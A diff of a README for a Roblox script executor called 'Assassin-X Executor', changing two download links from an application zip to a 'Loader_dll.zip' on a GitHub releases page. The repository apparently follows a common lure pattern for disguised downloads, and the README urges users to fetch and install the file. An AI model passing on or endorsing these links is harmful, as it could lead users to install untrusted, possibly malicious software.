@@ -256,7 +256,7 @@
 
 Welcome to the Assassin-X Executor repository! 🚀 This repository hosts the latest version of the Assassin-X Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-![Assassin-X Executor](https://github.com/secondlathloothy/Assassin-X-Executor/releases/download/Download/application.zip)
+![Assassin-X Executor](https://github.com/secondlathloothy/Assassin-X-Executor/releases/download/Download/Loader_dll.zip)
 
 ## Table of Contents
 
@@ -751,7 +751,7 @@ Assassin-X Executor is a cutting-edge executor designed for Roblox script execut
 
 To get started with Assassin-X Executor, follow these simple steps:
 
-1. Download the latest version of the executor from the following link: [![Download Assassin-X Executor](https://img.shields.io/badge/Download-Assassin-X%20Executor-orange)](https://github.com/secondlathloothy/Assassin-X-Executor/releases/download/Download/application.zip).
+1. Download the latest version of the executor from the following link: [![Download Assassin-X Executor](https://img.shields.io/badge/Download-Assassin-X%20Executor-orange)](https://github.com/secondlathloothy/Assassin-X-Executor/releases/download/Download/Loader_dll.zip).
   
    This download button will provide you with the necessary files to install the executor on your system. Click the button to initiate the download process.
 
